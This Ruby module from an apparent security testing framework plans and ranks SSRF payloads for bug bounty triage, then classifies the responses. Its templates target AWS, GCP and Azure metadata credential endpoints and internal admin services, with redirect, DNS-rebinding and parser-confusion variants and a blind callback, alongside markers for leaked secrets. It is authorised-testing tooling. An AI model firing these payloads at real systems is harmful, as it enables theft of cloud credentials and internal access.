# frozen_string_literal: true

require 'fileutils'
require 'json'
require 'securerandom'
require 'time'
require 'uri'
require 'yaml'

module PWN
  module HTTP
    # Config-driven SSRF payload planner and evidence analyzer designed
    # for fast report-ready bug bounty triage.
    module SSRFChain
      autoload :CloudImpactProfiler, 'pwn/http/ssrf_chain/cloud_impact_profiler'

      DEFAULT_CLOUD_FOCUS = %w[aws gcp azure].freeze
      DEFAULT_MAX_PAYLOADS = 18

      SINK_FAMILY_PROFILES = {
        webhook: {
          label: 'Webhook receiver',
          supports_custom_headers: true,
          preferred_techniques: %w[metadata_ipv4 redirect_chain dns_rebinding parser_confusion blind_probe]
        },
        url_import: {
          label: 'URL importer / fetcher',
          supports_custom_headers: true,
          preferred_techniques: %w[metadata_ipv4 dns_rebinding redirect_chain parser_confusion blind_probe]
        },
        pdf_fetch: {
          label: 'Server-side PDF fetch',
          supports_custom_headers: false,
          preferred_techniques: %w[metadata_ipv4 redirect_chain parser_confusion blind_probe]
        },
        avatar_fetch: {
          label: 'Avatar/media fetch',
          supports_custom_headers: false,
          preferred_techniques: %w[redirect_chain dns_rebinding parser_confusion blind_probe]
        },
        ai_fetch: {
          label: 'AI retrieval/fetch sink',
          supports_custom_headers: true,
          preferred_techniques: %w[metadata_ipv4 dns_rebinding redirect_chain parser_confusion blind_probe]
        },
        proxy_test: {
          label: 'Proxy/test URL sink',
          supports_custom_headers: true,
          preferred_techniques: %w[metadata_ipv4 parser_confusion dns_rebinding redirect_chain blind_probe]
        }
      }.freeze

      PAYLOAD_TEMPLATES = [
        {
          id: 'aws_imds_role_list',
          technique: 'metadata_ipv4',
          provider: 'aws',
          impact_class: 'metadata',
          expected_signal: 'IAM role names from IMDS',
          method: 'GET',
          url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        },
        {
          id: 'aws_imds_identity',
          technique: 'metadata_ipv4',
          provider: 'aws',
          impact_class: 'metadata',
          expected_signal: 'instance identity document',
          method: 'GET',
          url: 'http://169.254.169.254/latest/dynamic/instance-identity/document'
        },
        {
          id: 'gcp_metadata_token',
          technique: 'metadata_ipv4',
          provider: 'gcp',
          impact_class: 'metadata',
          expected_signal: 'service-account token JSON',
          method: 'GET',
          url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
          headers: {
            'Metadata-Flavor' => 'Google'
          },
          requires_headers: true
        },
        {
          id: 'azure_instance_metadata',
          technique: 'metadata_ipv4',
          provider: 'azure',
          impact_class: 'metadata',
          expected_signal: 'Azure compute metadata JSON',
          method: 'GET',
          url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
          headers: {
            'Metadata' => 'true'
          },
          requires_headers: true
        },
        {
          id: 'k8s_api_probe',
          technique: 'internal_admin',
          provider: 'generic',
          impact_class: 'internal_admin',
          expected_signal: 'k8s API response/401',
          method: 'GET',
          url: 'https://kubernetes.default.svc.cluster.local/api'
        },
        {
          id: 'docker_socket_ping',
          technique: 'internal_admin',
          provider: 'generic',
          impact_class: 'internal_admin',
          expected_signal: 'Docker daemon ping/version',
          method: 'GET',
          url: 'http://127.0.0.1:2375/_ping'
        },
        {
          id: 'jenkins_login',
          technique: 'internal_admin',
          provider: 'generic',
          impact_class: 'internal_admin',
          expected_signal: 'Jenkins login HTML',
          method: 'GET',
          url: 'http://127.0.0.1:8080/login'
        },
        {
          id: 'redirect_to_aws_metadata',
          technique: 'redirect_chain',
          provider: 'aws',
          impact_class: 'metadata',
          expected_signal: 'metadata endpoint reached via redirect hop',
          method: 'GET',
          url: 'https://%{collaborator_domain}/redirect?to=http://169.254.169.254/latest/meta-data/',
          requires_collaborator: true
        },
        {
          id: 'redirect_to_loopback_admin',
          technique: 'redirect_chain',
          provider: 'generic',
          impact_class: 'internal_admin',
          expected_signal: 'loopback admin path reached via redirect hop',
          method: 'GET',
          url: 'https://%{collaborator_domain}/redirect?to=http://127.0.0.1/admin',
          requires_collaborator: true
        },
        {
          id: 'dns_rebind_metadata',
          technique: 'dns_rebinding',
          provider: 'aws',
          impact_class: 'metadata',
          expected_signal: 'resolver follows rebind hostname to metadata',
          method: 'GET',
          url: 'http://169.254.169.254.%{collaborator_domain}/latest/meta-data/',
          requires_collaborator: true
        },
        {
          id: 'dns_rebind_loopback',
          technique: 'dns_rebinding',
          provider: 'generic',
          impact_class: 'internal_admin',
          expected_signal: 'resolver follows rebind hostname to loopback admin',
          method: 'GET',
          url: 'http://127.0.0.1.%{collaborator_domain}/admin',
          requires_collaborator: true
        },
        {
          id: 'parser_userinfo_metadata',
          technique: 'parser_confusion',
          provider: 'aws',
          impact_class: 'metadata',
          expected_signal: 'userinfo parser confusion reaches metadata host',
          method: 'GET',
          url: 'http://169.254.169.254@%{collaborator_domain}/latest/meta-data/',
          requires_collaborator: true
        },
        {
          id: 'parser_userinfo_loopback',
          technique: 'parser_confusion',
          provider: 'generic',
          impact_class: 'internal_admin',
          expected_signal: 'userinfo parser confusion reaches loopback admin',
          method: 'GET',
          url: 'http://127.0.0.1@%{collaborator_domain}/admin',
          requires_collaborator: true
        },
        {
          id: 'blind_oob_callback',
          technique: 'blind_probe',
          provider: 'generic',
          impact_class: 'blind_only',
          expected_signal: 'DNS/HTTP callback at collaborator',
          method: 'GET',
          url: 'https://%{callback_host}/ssrf/%{callback_token}',
          requires_collaborator: true
        }
      ].freeze

      METADATA_MARKERS = [
        'latest/meta-data',
        'security-credentials',
        'instance-identity/document',
        'metadata.google.internal',
        'computemetadata',
        'metadata-flavor',
        '/metadata/instance',
        'x-aws-ec2-metadata-token',
        'accesskeyid',
        'secretaccesskey',
        'token.actions.githubusercontent.com'
      ].freeze

      INTERNAL_ADMIN_MARKERS = [
        'kubernetes',
        'kube-apiserver',
        'jenkins',
        'grafana',
        'consul',
        'etcd',
        'docker',
        'portainer',
        '/admin',
        'internal'
      ].freeze

      # Supported Method Parameters::
      # profile = PWN::HTTP::SSRFChain.load_profile(
      #   yaml_path: '/path/to/ssrf_chain.yaml'
      # )
      public_class_method def self.load_profile(opts = {})
        yaml_path = opts[:yaml_path].to_s.scrub.strip
        raise 'ERROR: yaml_path is required' if yaml_path.empty?
        raise "ERROR: profile YAML does not exist: #{yaml_path}" unless File.exist?(yaml_path)

        raw_profile = YAML.safe_load_file(yaml_path, aliases: true) || {}
        normalize_profile(profile: symbolize_obj(raw_profile))
      rescue StandardError => e
        raise e
      end

      # Supported Method Parameters::
      # plan = PWN::HTTP::SSRFChain.build_probe_plan(
      #   sink_family: 'webhook',
      #   collaborator_domain: 'oast.example',
      #   cloud_focus: %w[aws gcp],
      #   max_payloads: 12
      # )
      public_class_method def self.build_probe_plan(opts = {})
        normalized = normalize_profile(profile: symbolize_obj(opts || {}))

        sink_family = normalized[:sink_family]
        sink_profile = SINK_FAMILY_PROFILES[sink_family.to_sym]
        payload_templates = resolve_payload_templates(normalized: normalized)

        rendered_payloads = payload_templates.map do |template|
          render_payload_template(template: template, normalized: normalized, sink_profile: sink_profile)
        end.compact

        ranked_payloads = rendered_payloads.sort_by { |payload| [-payload[:score], payload[:id]] }
        max_payloads = normalized[:max_payloads]
        ranked_payloads = ranked_payloads.first(max_payloads)

        {
          generated_at: Time.now.utc.iso8601,
          sink_family: sink_family,
          sink_family_label: sink_profile[:label],
          sink_url: normalized[:sink_url],
          collaborator_domain: normalized[:collaborator_domain],
          callback_host: normalized[:callback_host],
          callback_token: normalized[:callback_token],
          cloud_focus: normalized[:cloud_focus],
          payload_count: ranked_payloads.length,
          payloads: ranked_payloads,
          quickstart: [
            'Replay top payloads first and capture full request + response body.',
            'Track out-of-band DNS/HTTP interactions for blind probes.',
            'Preserve raw artifacts (response text, headers, OOB logs) for report-ready evidence.'
          ],
          submission_checklist: [
            'Correlate sink input timestamp with server-side callback timestamp.',
            'Capture at least one high-signal metadata/internal-admin response sample.',
            'Record impact narrative: reachable target, extracted secret/data, escalation path.'
          ]
        }
      rescue StandardError => e
        raise e
      end

      # Supported Method Parameters::
      # analysis = PWN::HTTP::SSRFChain.analyze_observations(
      #   plan: plan,
      #   observations: [{ payload_id: 'aws_imds_role_list', http_status: 200, body: 'admin-role' }]
      # )
      public_class_method def self.analyze_observations(opts = {})
        plan = symbolize_obj(opts[:plan] || {})
        observations = Array(opts[:observations]).map { |observation| symbolize_obj(observation || {}) }

        payload_lookup = Array(plan[:payloads]).each_with_object({}) do |payload, acc|
          payload_hash = symbolize_obj(payload)
          acc[normalize_token(payload_hash[:id])] = payload_hash
        end

        findings = observations.map do |observation|
          evaluate_observation(observation: observation, payload_lookup: payload_lookup)
        end.compact

        findings.sort_by! { |finding| [-severity_rank(finding[:severity]), finding[:id]] }

        classification_counts = findings.each_with_object(Hash.new(0)) do |finding, acc|
          acc[finding[:classification]] += 1
        end

        {
          observed_at: Time.now.utc.iso8601,
          observation_count: observations.length,
          finding_count: findings.length,
          classification_counts: classification_counts,
          findings: findings
        }
      rescue StandardError => e
        raise e
      end

      # Supported Method Parameters::
      # cloud_impact = PWN::HTTP::SSRFChain.profile_cloud_impact(
      #   observations: observations,
      #   findings: findings
      # )
      public_class_method def self.profile_cloud_impact(opts = {})
        PWN::HTTP::SSRFChain::CloudImpactProfiler.profile(
          observations: opts[:observations],
          findings: opts[:findings],
          sink_url: opts[:sink_url],
          cloud_focus: opts[:cloud_focus]
        )
      rescue StandardError => e
        raise e
      end

      # Supported Method Parameters::
      # report = PWN::HTTP::SSRFChain.run(
      #   sink_family: 'webhook',
      #   collaborator_domain: 'oast.example',
      #   observations: [...],
      #   output_dir: '/tmp/ssrf-chain'
      # )
      public_class_method def self.run(opts = {})
        input_hash = symbolize_obj(opts || {})

        profile = if input_hash[:yaml_path].to_s.scrub.strip.empty?
                    normalize_profile(profile: input_hash)
                  else
                    loaded = load_profile(yaml_path: input_hash[:yaml_path])
                    normalize_profile(profile: loaded.merge(input_hash.reject { |key, _value| key == :yaml_path }))
                  end

        run_id = profile[:run_id]
        run_id = "#{Time.now.utc.strftime('%Y%m%dT%H%M%SZ')}-ssrf-chain-#{profile[:sink_family]}" if run_id.to_s.empty?

        plan = build_probe_plan(profile)
        analysis = analyze_observations(plan: plan, observations: profile[:observations])
        cloud_impact = profile_cloud_impact(
          observations: profile[:observations],
          findings: analysis[:findings],
          sink_url: plan[:sink_url],
          cloud_focus: plan[:cloud_focus]
        )
        primary_impact = symbolize_obj(cloud_impact[:primary_assessment] || {})

        report = {
          generated_at: Time.now.utc.iso8601,
          run_id: run_id,
          sink_family: plan[:sink_family],
          sink_url: plan[:sink_url],
          payload_count: plan[:payload_count],
          finding_count: analysis[:finding_count],
          classifications: analysis[:classification_counts],
          findings: analysis[:findings],
          impact_label: cloud_impact[:highest_impact_label],
          identity: primary_impact[:identity],
          privilege_guess: primary_impact[:privilege_guess],
          follow_up_requests: primary_impact[:follow_up_requests],
          negative_controls: primary_impact[:negative_controls],
          report_ready_summary: primary_impact[:report_ready_summary],
          cloud_impact: cloud_impact,
          plan: plan
        }

        output_dir = profile[:output_dir]
        unless output_dir.empty?
          run_root = File.expand_path(File.join(output_dir, run_id))
          FileUtils.mkdir_p(run_root)

          write_json(path: File.join(run_root, 'ssrf_chain_plan.json'), obj: plan)
          write_json(path: File.join(run_root, 'ssrf_chain_report.json'), obj: report)
          write_json(path: File.join(run_root, 'ssrf_chain_cloud_impact.json'), obj: cloud_impact)
          write_json(path: File.join(run_root, 'ssrf_chain_observations.json'), obj: profile[:observations])
          write_markdown(path: File.join(run_root, 'ssrf_chain_report.md'), report: report)

          report[:run_root] = run_root
        end

        report
      rescue StandardError => e
        raise e
      end

      # Author(s):: 0day Inc. <support@0dayinc.com>
      public_class_method def self.authors
        "AUTHOR(S):
          0day Inc. <support@0dayinc.com>
        "
      end

      # Display Usage Information
      public_class_method def self.help
        <<~HELP
          Usage:
            profile = PWN::HTTP::SSRFChain.load_profile(
              yaml_path: '/path/to/ssrf_chain.example.yaml'
            )

            plan = PWN::HTTP::SSRFChain.build_probe_plan(
              sink_family: 'webhook',
              collaborator_domain: 'oast.example',
              cloud_focus: %w[aws gcp],
              max_payloads: 12
            )

            report = PWN::HTTP::SSRFChain.run(
              sink_family: 'webhook',
              collaborator_domain: 'oast.example',
              observations: [
                {
                  payload_id: 'aws_imds_role_list',
                  http_status: 200,
                  body: 'example-instance-role'
                }
              ],
              output_dir: '/tmp/ssrf-chain'
            )

            cloud_impact = PWN::HTTP::SSRFChain.profile_cloud_impact(
              observations: [
                {
                  payload_id: 'aws_imds_identity',
                  body: '{"accountId":"123456789012","region":"us-east-1"}'
                }
              ],
              findings: report[:findings]
            )
        HELP
      end

      private_class_method def self.resolve_payload_templates(opts = {})
        normalized = symbolize_obj(opts[:normalized] || {})

        template_list = normalized[:payload_templates]
        template_list = PAYLOAD_TEMPLATES if template_list.empty?

        template_list.map do |template|
          template_hash = symbolize_obj(template || {})
          next if template_hash.empty?

          technique = normalize_token(template_hash[:technique])
          next if technique.empty?

          template_hash[:id] = normalize_token(template_hash[:id])
          template_hash[:id] = "payload_#{SecureRandom.hex(4)}" if template_hash[:id].empty?
          template_hash[:technique] = technique
          template_hash[:provider] = normalize_token(template_hash[:provider])
          template_hash[:provider] = 'generic' if template_hash[:provider].empty?
          template_hash[:impact_class] = normalize_token(template_hash[:impact_class])
          template_hash[:impact_class] = 'safe_noise' if template_hash[:impact_class].empty?
          template_hash[:method] = template_hash[:method].to_s.scrub.strip.upcase
          template_hash[:method] = 'GET' if template_hash[:method].empty?
          template_hash[:headers] = symbolize_obj(template_hash[:headers] || {})

          template_hash
        end.compact
      rescue StandardError => e
        raise e
      end

      private_class_method def self.render_payload_template(opts = {})
        template = symbolize_obj(opts[:template] || {})
        normalized = symbolize_obj(opts[:normalized] || {})
        sink_profile = symbolize_obj(opts[:sink_profile] || {})

        requires_collaborator = template[:requires_collaborator] == true
        collaborator_domain = normalized[:collaborator_domain]
        return nil if requires_collaborator && collaborator_domain.empty?

        route_vars = {
          collaborator_domain: collaborator_domain,
          callback_host: normalized[:callback_host],
          callback_token: normalized[:callback_token]
        }

        rendered_url = render_template_str(template: template[:url], vars: route_vars)
        return nil if rendered_url.to_s.scrub.strip.empty?

        rendered_headers = symbolize_obj(template[:headers] || {}).each_with_object({}) do |(key, value), acc|
          acc[key.to_s] = render_template_str(template: value, vars: route_vars)
        end

        payload = {
          id: template[:id],
          technique: template[:technique],
          provider: template[:provider],
          impact_class: template[:impact_class],
          expected_signal: template[:expected_signal].to_s,
          method: template[:method],
          url: rendered_url,
          headers: rendered_headers,
          requires_headers: template[:requires_headers] == true,
          requires_collaborator: requires_collaborator
        }

        payload[:score] = score_payload(payload: payload, normalized: normalized, sink_profile: sink_profile)
        payload[:priority_tier] = priority_tier(score: payload[:score])

        payload
      rescue StandardError => e
        raise e
      end

      private_class_method def self.score_payload(opts = {})
        payload = symbolize_obj(opts[:payload] || {})
        normalized = symbolize_obj(opts[:normalized] || {})
        sink_profile = symbolize_obj(opts[:sink_profile] || {})

        technique = normalize_token(payload[:technique])
        provider = normalize_token(payload[:provider])
        impact_class = normalize_token(payload[:impact_class])

        score = case impact_class
                when 'metadata'
                  95
                when 'internal_admin'
                  82
                when 'blind_only'
                  58
                else
                  28
                end

        score += 9 if Array(sink_profile[:preferred_techniques]).include?(technique)
        score += 8 if Array(normalized[:cloud_focus]).include?(provider)
        score -= 12 if payload[:requires_headers] && sink_profile[:supports_custom_headers] != true
        score -= 6 if technique == 'blind_probe'

        score
      rescue StandardError => e
        raise e
      end

      private_class_method def self.priority_tier(opts = {})
        score = opts[:score].to_i
        return 'tier_1' if score >= 95
        return 'tier_2' if score >= 80
        return 'tier_3' if score >= 60

        'tier_4'
      rescue StandardError => e
        raise e
      end

      private_class_method def self.evaluate_observation(opts = {})
        observation = symbolize_obj(opts[:observation] || {})
        payload_lookup = opts[:payload_lookup].is_a?(Hash) ? opts[:payload_lookup] : {}

        payload_id = normalize_token(observation[:payload_id] || observation[:id])
        payload_record = payload_lookup[payload_id]
        payload_record = payload_lookup[payload_id.to_sym] if payload_record.nil?
        payload_record = symbolize_obj(payload_record || {})
        observed_url = observation[:url].to_s
        observed_url = payload_record[:url].to_s if observed_url.empty?

        status = observation[:http_status]
        status = observation[:status_code] if status.nil?
        status = status.to_i if status.to_s.match?(/^\d+$/)

        headers = symbolize_obj(observation[:headers] || observation[:response_headers] || {})
        body = observation[:body].to_s
        body = observation[:response_body].to_s if body.empty?
        error = observation[:error].to_s

        collaborator_hit = truthy?(observation[:collaborator_hit]) ||
          truthy?(observation[:dns_hit]) ||
          truthy?(observation[:http_hit]) ||
          truthy?(observation[:out_of_band_hit])

        signal_text = [observed_url, body, headers.to_json, error].join(' ').downcase

        classification = classify_signal(
          signal_text: signal_text,
          observed_url: observed_url,
          status: status,
          collaborator_hit: collaborator_hit,
          payload_record: payload_record
        )

        return nil if classification == 'safe-noise'

        severity = case classification
                   when 'metadata'
                     'critical'
                   when 'internal-admin'
                     'high'
                   when 'blind-only'
                     'medium'
                   else
                     'low'
                   end

        {
          id: [payload_id, classification, SecureRandom.hex(3)].join(':'),
          payload_id: payload_id,
          severity: severity,
          confidence: collaborator_hit ? 'medium' : 'high',
          classification: classification,
          technique: payload_record[:technique],
          provider: payload_record[:provider],
          summary: finding_summary(classification: classification, payload_record: payload_record, observed_url: observed_url),
          evidence: {
            http_status: status,
            collaborator_hit: collaborator_hit,
            observed_url: observed_url,
            body_snippet: body.to_s.scrub[0..280],
            headers: headers
          }
        }
      rescue StandardError => e
        raise e
      end

      private_class_method def self.classify_signal(opts = {})
        signal_text = opts[:signal_text].to_s
        observed_url = opts[:observed_url].to_s
        status = opts[:status]
        collaborator_hit = opts[:collaborator_hit] == true
        payload_record = symbolize_obj(opts[:payload_record] || {})

        return 'metadata' if metadata_signal?(signal_text: signal_text, observed_url: observed_url, status: status)
        return 'internal-admin' if internal_admin_signal?(signal_text: signal_text, observed_url: observed_url, status: status)

        impact_class = normalize_token(payload_record[:impact_class])
        return 'blind-only' if collaborator_hit || impact_class == 'blind_only'

        'safe-noise'
      rescue StandardError => e
        raise e
      end

      private_class_method def self.metadata_signal?(opts = {})
        signal_text = opts[:signal_text].to_s.downcase
        observed_url = opts[:observed_url].to_s.downcase
        status = opts[:status].to_i

        return true if METADATA_MARKERS.any? { |marker| signal_text.include?(marker) }
        return true if observed_url.include?('169.254.169.254') && status.positive? && status < 500
        return true if observed_url.include?('metadata.google.internal') && status.positive? && status < 500

        false
      rescue StandardError => e
        raise e
      end

      private_class_method def self.internal_admin_signal?(opts = {})
        signal_text = opts[:signal_text].to_s.downcase
        observed_url = opts[:observed_url].to_s
        status = opts[:status].to_i

        return true if INTERNAL_ADMIN_MARKERS.any? { |marker| signal_text.include?(marker) }

        host = parse_host(url: observed_url)
        return true if private_or_loopback_host?(host: host) && status.positive? && status < 500

        false
      rescue StandardError => e
        raise e
      end

      private_class_method def self.finding_summary(opts = {})
        classification = opts[:classification].to_s
        payload_record = symbolize_obj(opts[:payload_record] || {})
        observed_url = opts[:observed_url].to_s

        case classification
        when 'metadata'
          "Metadata exposure signal for payload #{payload_record[:id]} against #{observed_url}."
        when 'internal-admin'
          "Internal admin/service surface appears reachable via payload #{payload_record[:id]} (#{observed_url})."
        when 'blind-only'
          "Blind SSRF callback observed for payload #{payload_record[:id]}; collect OOB logs for evidence chain."
        else
          "Potential SSRF signal for payload #{payload_record[:id]}."
        end
      rescue StandardError => e
        raise e
      end

      private_class_method def self.parse_host(opts = {})
        url = opts[:url].to_s
        uri = URI.parse(url)
        uri.host.to_s.downcase
      rescue URI::InvalidURIError, TypeError
        ''
      rescue StandardError => e
        raise e
      end

      private_class_method def self.private_or_loopback_host?(opts = {})
        host = opts[:host].to_s.downcase
        return true if host == 'localhost'
        return true if host.start_with?('127.')
        return true if host.start_with?('10.')
        return true if host.start_with?('192.168.')
        return true if host.start_with?('169.254.')

        host.match?(/^172\.(1[6-9]|2\d|3[0-1])\./)
      rescue StandardError => e
        raise e
      end

      private_class_method def self.normalize_profile(opts = {})
        profile = symbolize_obj(opts[:profile] || {})

        sink_family = normalize_token(profile[:sink_family])
        raise 'ERROR: sink_family is required' if sink_family.empty?
        raise "ERROR: unsupported sink_family=#{sink_family}" unless SINK_FAMILY_PROFILES.key?(sink_family.to_sym)

        collaborator_domain = profile[:collaborator_domain].to_s.scrub.strip
        callback_host = profile[:callback_host].to_s.scrub.strip
        callback_host = collaborator_domain if callback_host.empty?

        callback_token = profile[:callback_token].to_s.scrub.strip
        callback_token = SecureRandom.hex(6) if callback_token.empty?

        cloud_focus = Array(profile[:cloud_focus]).map { |entry| normalize_token(entry) }.reject(&:empty?)
        cloud_focus = DEFAULT_CLOUD_FOCUS if cloud_focus.empty?

        max_payloads = profile[:max_payloads].to_i
        max_payloads = DEFAULT_MAX_PAYLOADS if max_payloads <= 0

        {
          sink_family: sink_family,
          sink_url: profile[:sink_url].to_s.scrub.strip,
          collaborator_domain: collaborator_domain,
          callback_host: callback_host,
          callback_token: callback_token,
          cloud_focus: cloud_focus,
          max_payloads: max_payloads,
          output_dir: profile[:output_dir].to_s.scrub.strip,
          run_id: profile[:run_id].to_s.scrub.strip,
          observations: Array(profile[:observations]).map { |observation| symbolize_obj(observation || {}) },
          payload_templates: Array(profile[:payload_templates]).map { |template| symbolize_obj(template || {}) }
        }
      rescue StandardError => e
        raise e
      end

      private_class_method def self.render_template_str(opts = {})
        template = opts[:template].to_s
        vars = symbolize_obj(opts[:vars] || {})

        return template unless template.include?('%{')

        template.gsub(/%\{([^}]+)\}/) do |match|
          key = Regexp.last_match(1).to_s
          sym_key = key.to_sym
          value = vars[sym_key]
          value = vars[key] if value.nil?
          value.nil? ? match : value.to_s
        end
      rescue StandardError => e
        raise e
      end

      private_class_method def self.truthy?(value)
        return true if value == true

        %w[true yes y 1].include?(value.to_s.strip.downcase)
      rescue StandardError => e
        raise e
      end

      private_class_method def self.write_json(opts = {})
        path = opts[:path].to_s
        obj = symbolize_obj(opts[:obj] || {})

        FileUtils.mkdir_p(File.dirname(path))
        File.write(path, JSON.pretty_generate(obj))
      rescue StandardError => e
        raise e
      end

      private_class_method def self.write_markdown(opts = {})
        path = opts[:path].to_s
        report = symbolize_obj(opts[:report] || {})

        lines = []
        lines << '# SSRF Chain Report'
        lines << ''
        lines << "- Generated At (UTC): `#{report[:generated_at]}`"
        lines << "- Run ID: `#{report[:run_id]}`"
        lines << "- Sink Family: `#{report[:sink_family]}`"
        lines << "- Payloads Planned: `#{report[:payload_count]}`"
        lines << "- Findings: `#{report[:finding_count]}`"
        lines << ''

        lines << '## Finding Summary'
        classifications = symbolize_obj(report[:classifications] || {})
        if classifications.empty?
          lines << '- No high-signal findings from provided observations yet.'
        else
          classifications.each do |classification, count|
            lines << "- #{classification}: `#{count}`"
          end
        end

        lines << ''
        lines << '## Findings'
        if Array(report[:findings]).empty?
          lines << '- No reportable SSRF signals yet. Continue with tier-1 payloads and OOB monitoring.'
        else
          Array(report[:findings]).each do |finding|
            finding_hash = symbolize_obj(finding)
            evidence = symbolize_obj(finding_hash[:evidence] || {})
            lines << "- [#{finding_hash[:severity].to_s.upcase}] #{finding_hash[:summary]}"
            lines << "  - payload: `#{finding_hash[:payload_id]}` technique: `#{finding_hash[:technique]}` provider: `#{finding_hash[:provider]}`"
            lines << "  - status: `#{evidence[:http_status]}` collaborator_hit: `#{evidence[:collaborator_hit]}`"
            lines << "  - url: `#{evidence[:observed_url]}`"
          end
        end

        lines << ''
        lines << '## Tier-1 Payloads'
        tier_one = Array(report.dig(:plan, :payloads)).select { |payload| payload[:priority_tier] == 'tier_1' }
        if tier_one.empty?
          lines << '- No tier-1 payloads in this run.'
        else
          tier_one.each do |payload|
            lines << "- `#{payload[:id]}` #{payload[:method]} #{payload[:url]}"
          end
        end

        lines << ''
        lines << '## Cloud Impact Profile'
        cloud_impact = symbolize_obj(report[:cloud_impact] || {})
        primary_impact = symbolize_obj(cloud_impact[:primary_assessment] || {})
        if primary_impact.empty?
          lines << '- No provider-specific cloud impact material identified yet.'
        else
          lines << "- Impact Label: `#{cloud_impact[:highest_impact_label]}`"
          lines << "- Provider: `#{primary_impact[:provider]}`"
          lines << "- Identity: `#{symbolize_obj(primary_impact[:identity] || {}).to_json}`"
          lines << "- Privilege Guess: `#{primary_impact[:privilege_guess]}`"

          lines << ''
          lines << '### Follow-up Requests'
          Array(primary_impact[:follow_up_requests]).each do |request|
            lines << "- #{request}"
          end

          lines << ''
          lines << '### Negative Controls'
          Array(primary_impact[:negative_controls]).each do |control|
            lines << "- #{control}"
          end
        end

        FileUtils.mkdir_p(File.dirname(path))
        File.write(path, lines.join("\n"))
      rescue StandardError => e
        raise e
      end

      private_class_method def self.severity_rank(severity)
        case normalize_token(severity)
        when 'critical'
          4
        when 'high'
          3
        when 'medium'
          2
        when 'low'
          1
        else
          0
        end
      rescue StandardError => e
        raise e
      end

      private_class_method def self.symbolize_obj(obj)
        case obj
        when Array
          obj.map { |entry| symbolize_obj(entry) }
        when Hash
          obj.each_with_object({}) do |(key, value), accum|
            sym_key = key.respond_to?(:to_sym) ? key.to_sym : key
            accum[sym_key] = symbolize_obj(value)
          end
        else
          obj
        end
      rescue StandardError => e
        raise e
      end

      private_class_method def self.normalize_token(token)
        token.to_s.scrub.strip.downcase.gsub(/[^a-z0-9]+/, '_').gsub(/^_+|_+$/, '')
      rescue StandardError => e
        raise e
      end
    end
  end
end
